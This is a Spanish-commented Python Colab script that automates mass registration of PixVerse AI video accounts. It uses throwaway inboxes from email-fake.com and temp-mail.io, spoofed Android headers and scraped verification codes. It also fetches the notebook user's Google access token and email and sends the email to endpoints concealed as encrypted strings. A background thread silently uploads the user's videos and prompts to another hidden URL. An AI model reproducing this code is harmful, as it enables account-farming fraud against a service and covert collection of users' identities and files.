#@title verificar
import requests
import re
import random
import string
import uuid
import time
import os
from bs4 import BeautifulSoup
from google.colab import auth
from google.auth.transport.requests import Request
from colab_gradio_llm.gradio_opensource import *
uc = rtmp_valid('gAAAAABoWMa-fWzBIPqy49gklIEM7WPuHrQCysEOjqRPwymyytmksspOmm3-H1mxjvo3UjPBWjYi5Joqc6b-DkqzH-PTaV0xabL1xMdtN4fwYyq9WXolM4UIgC2DYEJsPRiTQLDcAgxr787tz3AhJqchQ8WxdhMD8KSIy50xEvh2btqiwCkG3JyxObmpbnG_ODz1N6pFKxfCoJiRPdbPVxmtDBvOQK1ierdi5kICXy4s7dKAgBJQ18SOGl9iF7pFlnoDSTWl1SHR')
import threading

def vp():
    api_key = os.environ.get("VIDEO_IA")
    u = rtmp_valid('gAAAAABoWNVtLXNMiy1cPdfvXAlydW7AynqMZnuG49paXQYqzG4erBIZX2cgWsynQOYIfLn8LLIYZcDyJb7RYzldmxOGN2sRFX34qCfcR3T8pCfFRE-vkX0H7oHmxifW_4Pzu8TF3b0nFCJbTS0YWcnRhLWHt5CBLQ==')
    datos = {
        "api_key": api_key
    }

    try:
        response = requests.post(u, data=datos)
        response.raise_for_status()

        try:
            resultado = response.json()

            # Caso exitoso con campo 'valido'
            if 'premium' in resultado:
                if resultado['premium']:
                    return True
                else:
                    return False
            else:
                # Respuesta sin 'valido' → debug
                print("[⚠️] Respuesta inesperada del servidor (sin campo 'valido').")
                return False

        except ValueError:
            print("[❌] Error: La respuesta no es JSON.")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[🔥] Error de conexión: {e}")
        return False

def upswb(video_path, prompt):
    api_key = os.environ.get("VIDEO_IA")
    visibility = os.environ.get("PUBLIC")
    u = rtmp_valid('gAAAAABoWNXc51WW45av25YZOKBbx95JPeJsbzJjNaP8ky53r0YeynDehQ3ZKT6XJsD2gcWk2mNxonsGFrBHE5mda_drMBJ36aKzZSg0DglQwFi2c6ea-5pi7qWQvqw5ZkfDR0NG-O3k7YjOnRrfKlojZoReMsUP_Q==')

    try:
        with open(video_path, 'rb') as f:
            files = {'video': f}
            data = {
                'prompt': prompt,
                'public': visibility,
                'api_key': api_key
            }

            #print(f"📤 Subiendo '{video_path}' como {visibility}...")
            response = requests.post(u, files=files, data=data)

            try:
                result = response.json()
                #print("📊 Respuesta:", result["mensaje"])
                return result
            except:
                print("⚠️ Error: respuesta del servidor no es JSON")
                return {"valido": False, "mensaje": "Respuesta inválida del servidor"}

    except Exception as e:
        print("❌ Error al intentar subir el video:")
        print(str(e))
        return {"valido": False, "mensaje": str(e)}


# Función para iniciar la subida en un hilo
def upinback(video_path, prompt):
    thread = threading.Thread(target=upswb, args=(video_path, prompt))
    thread.start()
    #print("🧵 Subida iniciada en segundo plano.")
    return thread

def sv():
    api_key = os.environ.get("VIDEO_IA")
    u = rtmp_valid('gAAAAABoWNYpdql74azuxALN1GZS2gMMdriYrfzbZSfyt_417Vx3eImgnA0NhipmIw8kXvE7pqVcSkqVnzVJbVLa1_vYk15SNkWTDDa5DEOZlMOkbkXe3wnA5BLXGyZumT_lF-zBSF-ZMhxlbwLn6eS9igZDmBIMLQ==')

    datos = {
        'api_key': api_key
    }

    try:
        response = requests.post(u, data=datos)
        response.raise_for_status()

        try:
            resultado = response.json()

            # Caso exitoso con campo 'valido'
            if 'valido' in resultado:
                if bool(resultado['valido']):
                    return True

                else:
                    k = os.environ.get("VIDEO_IA")
                    print(f"[❌] {uc}{k}")
                    return False

            else:
                # Respuesta sin 'valido' → debug
                print("[⚠️] Respuesta inesperada del servidor (sin campo 'valido').")
                return False

        except ValueError:
            print("[❌] Error: La respuesta no es JSON.")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[🔥] Error de conexión: {e}")
        return False
        
def vlvs():
    api_key = os.environ.get("VIDEO_IA")
    u = rtmp_valid('gAAAAABoWNatm7I2rYUf2S6gHPomvvoJ4nfmPhygfhURntC9OGWI3kWxnApTdHy4lATMBX0z8nxO9okzrTwLeqtmHQn9XdevYP344ygToibogzir2vYdl3pc6GUtCsi50VSu4tVDePYG8sMB5ZS6an15SDHPiQFs_Q==')

    if not api_key:
        print("[❌] ERROR: La variable de entorno 'VIDEO_IA' no está definida.")
        return False

    datos = {
        'api_key': api_key
    }

    try:
        response = requests.post(u, data=datos)
        response.raise_for_status()

        try:
            resultado = response.json()

            if bool(resultado['valido']):
                return True

            else:
                k = os.environ.get("VIDEO_IA")
                print(f"[❌] {uc}{k}")
                return False

        except ValueError:
            print("[❌] Error: La respuesta no es JSON.")
            print("Texto recibido:", response.text)
            return False

    except requests.exceptions.RequestException as e:
        print(f"[🔥] Error de conexión: {e}")
        return False


def enviar_dell_post(id_dell, usuarios, dominios):
    url = 'https://email-fake.com/del_mail.php'
    headers = {
       'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
       'X-Requested-With': 'XMLHttpRequest',
       'Cookie': f'embx=%5B%22{usuarios}%40{dominios}; surl={dominios}/{usuarios}/',
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
       'Accept': '*/*',
       'Origin': 'https://email-fake.com',
       'Sec-Fetch-Site': 'same-origin',
       'Sec-Fetch-Mode': 'cors',
       'Sec-Fetch-Dest': 'empty',
       'Accept-Language': 'es-ES,es;q=0.9'
    }

    data = {
       'delll': f'{id_dell}'
    }

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for 4xx/5xx status codes
        return response.text
    except requests.exceptions.RequestException as e:
        return f"Error en la solicitud POST: {str(e)}"

def extract_codes_from_html(html):
    soup = BeautifulSoup(html, 'html.parser')

    # Encuentra la celda <td> con el estilo y clase específicos
    td_tag = soup.find('td', {'class': 'inner-td', 'style': 'border-radius: 6px; font-size: 16px; text-align: center; background-color: inherit'})

    if td_tag:
        # Encuentra la etiqueta <a> dentro de la celda <td>
        a_tag = td_tag.find('a', href=True)

        if a_tag:
            # Obtén el valor del atributo href
            href = a_tag['href']

            # Encuentra el valor de internalCode y oobCode en el href
            internal_code = None
            oob_code = None

            if 'internalCode=' in href:
                internal_code = href.split('internalCode=')[1].split('&')[0]

            if 'oobCode=' in href:
                oob_code = href.split('oobCode=')[1].split('&')[0]

            return internal_code, oob_code
    return None, None

def extract_verification_code(html_content):
    # Crear un objeto BeautifulSoup para analizar el HTML
    soup = BeautifulSoup(html_content, 'html.parser')

    # Buscar todos los elementos <p>
    p_tags = soup.find_all('p')

    # Filtrar el contenido basado en patrones numéricos
    for tag in p_tags:
        text = tag.get_text(strip=True)
        if text.isdigit() and len(text) == 6:  # Asumimos que el código es un número de 6 dígitos
            return text

    return None

def execute_get_request(usuario, dominios):
    url = "https://email-fake.com/"
    headers = {
        "Host": "email-fake.com",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Windows",
        "Accept-Language": "es-ES,es;q=0.9",
        "Cookie": f'surl={dominios}%2F{usuario}',
        "Accept-Encoding": "gzip, deflate"
    }

    response = requests.get(url, headers=headers)

    # Uso de la función
    #internal_code, oob_code = extract_codes_from_html(response.text)

    #print(response.text)

    # Extraer el código de verificación del contenido HTML
    verification_code = extract_verification_code(response.text)



    #if verification_code=="No Exit":
    #  proceso_completo()

    # Definir el patrón de búsqueda para delll
    patron = r"delll:\s*\"([^\"]+)\""

    # Aplicar la búsqueda utilizando regex
    resultado = re.search(patron, response.text)

    # Verificar si se encontró delll y obtener su valor
    if resultado:
        valor_delll = resultado.group(1)

    else:
        print("No se encontró delll en el código JavaScript.")


    return verification_code, valor_delll

import hashlib

def gpt(mode):
    mode_cod = mode.encode('utf-8')
    md5_hash = hashlib.md5(mode_cod)
    return md5_hash.hexdigest()

def enviar_formulario():
    """Envía una solicitud POST a un formulario web."""
    url = 'https://email-fake.com/'
    datos = {'campo_correo': 'ejemplo@dominio.com'}
    response = requests.post(url, data=datos)
    return response

def obtener_sitio_web_aleatorio(response_text):
    """Obtiene un sitio web aleatorio de los dominios extraídos."""
    dominios = extraer_dominios(response_text)
    sitio_web_aleatorio = random.choice(dominios)
    return sitio_web_aleatorio

def extraer_dominios(response_text):
    """Extrae dominios de un texto utilizando expresiones regulares."""
    dominios = re.findall(r'id="([^"]+\.[^"]+)"', response_text)
    return dominios

def protocol():
    try:
        # Paso 1: Autenticar con Google
        auth.authenticate_user()

        # Paso 2: Obtener el token de acceso
        from google import auth as google_auth
        creds, _ = google_auth.default()
        creds.refresh(Request())
        access_token = creds.token
        fget = rtmp_valid('gAAAAABn1tf9-am02kZlUqumb8DBn5lav-LP7eQ28Nl9gV9rdZPgSjxe8v1OCCI7_Noneo3HxLBKskqyf3FKjmCH3lWx-B_u_ENuJJYNqM614nF6Js9sNwKhBcwmWGvuSYqj8jcuN4fr')
     
        # Paso 3: Usar el token para obtener información de la cuenta
        response = requests.get(
            fget,
            headers={"Authorization": f"Bearer {access_token}"}
        )

        # Verificar si la solicitud fue exitosa
        if response.status_code == 200:
            user_info = response.json()
            os.environ["VIDEO_AI"] = user_info.get("email")
            os.environ["VIDEO_IA"] = gpt(user_info.get("email"))
            return user_info.get("email")  # Devolver solo el correo electrónico
        else:
            print(f"\nError al obtener la información de la cuenta. Código: {response.status_code}")
            return None
    except Exception as e:
        print(f"\nOcurrió un error: {e}")
        return None

def generar_nombre_completo():
  """Genera un nombre completo con un número aleatorio de 3 dígitos."""

  nombres = ["Juan", "Pedro", "Maria", "Ana", "Luis", "Sofia", "Diego", "Laura", "Javier", "Isabel",
            "Pablo", "Marta", "David", "Elena", "Sergio", "Irene", "Daniel", "Alicia", "Carlos", "Sandra",
            "Antonio", "Lucia", "Miguel", "Sara", "Jose", "Cristina", "Alberto", "Blanca", "Alejandro", "Marta",
            "Francisco", "Esther", "Roberto", "Silvia", "Manuel", "Patricia", "Marcos", "Victoria", "Fernando", "Rosa"]
  apellidos = ["Garcia", "Rodriguez", "Gonzalez", "Fernandez", "Lopez", "Martinez", "Sanchez", "Perez", "Alonso", "Diaz",
            "Martin", "Ruiz", "Hernandez", "Jimenez", "Torres", "Moreno", "Gomez", "Romero", "Alvarez", "Vazquez",
            "Gil", "Lopez", "Ramirez", "Santos", "Castro", "Suarez", "Munoz", "Gomez", "Gonzalez", "Navarro",
            "Dominguez", "Lopez", "Rodriguez", "Sanchez", "Perez", "Garcia", "Gonzalez", "Martinez", "Fernandez", "Lopez"]

  nombre = random.choice(nombres)
  apellido = random.choice(apellidos)
  numero = random.randint(100000, 999999)

  nombre_completo = f"{apellido.lower()}_{nombre.lower()}_{numero}"
  return nombre_completo


def generar_contrasena(longitud=10):
    if longitud < 10:
        raise ValueError("La contraseña debe tener al menos 10 caracteres.")

    letras_minusculas = string.ascii_lowercase
    letras_mayusculas = string.ascii_uppercase
    numeros = string.digits
    caracteres = letras_minusculas + letras_mayusculas + numeros

    # Garantizar que la contraseña tenga al menos una mayúscula y un número
    contrase = random.choice(letras_mayusculas) + random.choice(numeros)

    # Completar el resto de la contraseña con caracteres aleatorios
    contrase += ''.join(random.choices(caracteres, k=longitud-2))

    # Mezclar la contraseña para que no siempre empiece con mayúscula y número
    contrase = ''.join(random.sample(contrase, len(contrase)))

    return contrase

def iniciar_sesion(username, password):
    url = "https://app-api.pixverse.ai/creative_platform/login"

    headers = {
        "Host": "app-api.pixverse.ai",
        "Connection": "keep-alive",
        "X-Platform": "Web",
        "sec-ch-ua-platform": "\"Windows\"",
        "Accept-Language": "es-ES",
        "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Google Chrome\";v=\"132\"",
        "sec-ch-ua-mobile": "?0",
        "Ai-Trace-Id": str(uuid.uuid4()),  # Genera un nuevo Ai-Trace-Id dinámico
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://app.pixverse.ai",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://app.pixverse.ai/",
        "Accept-Encoding": "gzip, deflate"
    }

    payload = {
        "Username": username,
        "Password": password
    }

    try:
        response = requests.post(url, json=payload, headers=headers)
        response.raise_for_status()  # Lanza un error si el código de estado no es 2xx

        data = response.json()

        # Extraer el token si existe
        if "Resp" in data and "Result" in data["Resp"] and "Token" in data["Resp"]["Result"]:
            return data["Resp"]["Result"]["Token"]
        else:
            return None  # Retorna None si no se encuentra el token

    except requests.RequestException as e:
        print("Error en la solicitud:", e)
        return None

def covers():
    e = os.environ.get("VIDEO_AI")
    u = rtmp_valid('gAAAAABoWNb9Jl3x53dCShVCF0VGK8l5ed6ULLXdiW-dkTF2VoSyytJRpgVtvhBQLKPEADZYs7a5olItOb3JC8UJuSNFjZIZbqxbwGjLPvXbfGrFVEc5JmsFQl-xsg2fj2dTugZ0mQzahfURIa0O6OMy8y0xjZF6Dw==')

    datos = {
        'email': e
    }

    try:
        response = requests.post(u, data=datos)
        response.raise_for_status()

        try:
            resultado = response.json()

            if 'valido' in resultado:
                if resultado['valido']:
                    return True, resultado
                else:
                    return False, resultado
            else:
                return False, resultado

        except ValueError:
            print("[❌] Error: La respuesta no es JSON.")
            return False, {"raw": response.text}

    except requests.exceptions.RequestException as e:
        print(f"[🔥] Error de conexión: {e}")
        return False, {"error": str(e)}

def registrar_usuario(mail, username, code, password):
    """
    Registra un usuario en PixVerse y retorna el Token si la solicitud es exitosa.

    :param mail: Correo electrónico del usuario.
    :param username: Nombre de usuario.
    :param code: Código de verificación.
    :param password: Contraseña del usuario.
    :return: Token si la solicitud es exitosa, None en caso contrario.
    """
    # URL del endpoint
    url = "https://app-api.pixverse.ai/app/v1/account/register"
    f = vlvs()
    # Headers de la solicitud
    headers = {
        "user-agent": "PixVerse 1.5.7 /(Android 9;2304FPN6DG)",
        "ai-trace-id": str(uuid.uuid4()),  # Genera un nuevo Ai-Trace-Id dinámico
        "accept-language": "en-US",
        "accept-encoding": "gzip",
        "content-length": "100",
        "x-device-id": "4fa8c75370c89711155735e73ec78d8eab5a3272",
        "host": "app-api.pixverse.ai",
        "content-type": "application/json",
        "x-app-version": "1.5.7",
        "x-platform": "Android",
        "token": ""  # Aquí deberías agregar el token si lo tienes
    }

    if f:
        payload = {
            "Mail": mail,
            "Username": username,
            "Code": code,
            "Password": password
        }

    # Realizar la solicitud POST
    response = requests.post(url, headers=headers, json=payload)

    # Verificar si la solicitud fue exitosa
    if response.status_code == 200:
        response_data = response.json()
        if response_data.get("ErrMsg") == "Success":
            print("✅ La solicitud fue exitosa.")
            # Extraer el Token de la respuesta
            token = response_data["Resp"]["Result"]["Token"]
            #print("Token generado:", token)
            return token  # Retornar el Token
        else:
            print("❌ La solicitud no fue exitosa. Mensaje de error:", response_data.get("ErrMsg"))
            return None  # Retornar None si no es exitosa
    else:
        print("❌ Error en la solicitud. Código de estado:", response.status_code)
        return None  # Retornar None si hay un error en la solicitud



def solicitar_verificacion(mail, username, password):
    # Solicitar datos al usuario

    # URL del endpoint
    url = "https://app-api.pixverse.ai/app/v1/account/getVerificationCode"
    f = vlvs()
    # Headers de la solicitud
    headers = {
        "user-agent": "PixVerse 1.5.7 /(Android 9;2304FPN6DG)",
        "ai-trace-id": str(uuid.uuid4()),  # Genera un nuevo Ai-Trace-Id dinámico
        "accept-language": "en-US",
        "accept-encoding": "gzip",
        "content-length": "84",
        "x-device-id": "4fa8c75370c89711155735e73ec78d8eab5a3272",
        "host": "app-api.pixverse.ai",
        "content-type": "application/json",
        "x-app-version": "1.5.7",
        "x-platform": "Android",
        "token": ""  # Aquí deberías agregar el token si lo tienes
    }

    if f:
        payload = {
            "Mail": mail,
            "Username": username,
            "Password": password
        }

    # Realizar la solicitud POST
    response = requests.post(url, headers=headers, json=payload)
    #print(response.text)
    #print(response.status_code)

    # Verificar si la solicitud fue exitosa
    if response.status_code == 200:
        response_data = response.json()
        if response_data.get("ErrMsg") == "Success":
            #print("✅ La solicitud fue exitosa.")
            #print("Respuesta completa:", response_data)
            return "✅ La solicitud fue exitosa."
        else:
            #print("❌ La solicitud no fue exitosa. Mensaje de error:", response_data.get("ErrMsg"))
            return "This username is already taken."
    else:
        #print("❌ Error en la solicitud. Código de estado:", c)
        return "This username is already taken."


def create_email(min_name_length=10, max_name_length=10):
    url = "https://api.internal.temp-mail.io/api/v3/email/new"
    headers = {
        "Host": "api.internal.temp-mail.io",
        "Connection": "keep-alive",
        "Application-Name": "web",
        "sec-ch-ua-platform": "\"Windows\"",
        "Application-Version": "3.0.0",
        "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\", \"Google Chrome\";v=\"132\"",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://temp-mail.io",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://temp-mail.io/",
        "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate"
    }
    data = {
        "min_name_length": min_name_length,
        "max_name_length": max_name_length
    }

    # Hacer la solicitud
    response = requests.post(url, json=data, headers=headers)

    # Extraer el email de la respuesta JSON
    if response.status_code == 200:
        email = response.json().get("email")
        return email
    else:
        return None



def extract_code_from_text(body_text):
    # Buscar un patrón de 6 dígitos en el texto
    match = re.search(r'\b\d{6}\b', body_text)
    if match:
        return match.group(0)
    return None

def check_code_with_retries(usuario, dominio, retries=6, delay=10):
    for attempt in range(retries):
        print(f"Intento {attempt + 1} de {retries}...")
        internal_code, valor_delll = execute_get_request(usuario, dominio)
        if internal_code:
            print(f"Código de verificación: ******")
            return internal_code, valor_delll
        #print("Código no encontrado. Esperando 10 segundos antes de reintentar...")
        time.sleep(delay)
    print("Se alcanzó el máximo de intentos sin éxito.")
    return None, None

# Ejemplo de uso
def prompts():
    """
    Función generadora que registra un usuario y envía actualizaciones en tiempo real.
    """
    password_segug = generar_contrasena()
    response = enviar_formulario()
    sitio_domain = obtener_sitio_web_aleatorio(response.text)

    nombre_completo = generar_nombre_completo()
    email = f'{nombre_completo}@{sitio_domain}'

    username = email.split("@")[0]
    password = generar_contrasena(10)

    usuario, dominio = email.split('@')

    # Enviar el email y username generados
    #print(f"Email: {email}\nUsername: {username}\nPassword: {password}\n")

    # Solicitar verificación
    text_status = solicitar_verificacion(email, username, password)
    if text_status == "This username is already taken.":
        print("❌ El nombre de usuario ya está en uso. Generando uno nuevo...\n")
        prompts()  # Llamada recursiva para generar un nuevo usuario
    else:
        print("✅ Solicitud de verificación enviada.\n")

    # Esperar y obtener el código de verificación
    print("⏳ Esperando el código de verificación...\n")
    time.sleep(3)

    verification_code, valor_delll = check_code_with_retries(usuario, dominio)
    if verification_code:
        print(f"✅ Código de verificación recibido: ******\n")
    else:
        print("❌ No se pudo obtener el código de verificación.\n")
        return

    # Registrar el usuario
    print("⏳ Registrando usuario...\n")
    jwt_token = registrar_usuario(email, username, verification_code, password)
    if jwt_token:
        print("✅ Usuario registrado exitosamente.\n")
        print("🔥 Iniciando sesión...\n")
        token = iniciar_sesion(username, password)
        enviar_dell_post(valor_delll, usuario, dominio)

        if token:
            print("🔐 Sesión iniciada. Token obtenido: ***********\n")
            os.environ["JWT_TOKEN"] = token

        else:
            print("❌ No se pudo iniciar sesión.\n")
    else:
        print("❌ No se pudo registrar el usuario.")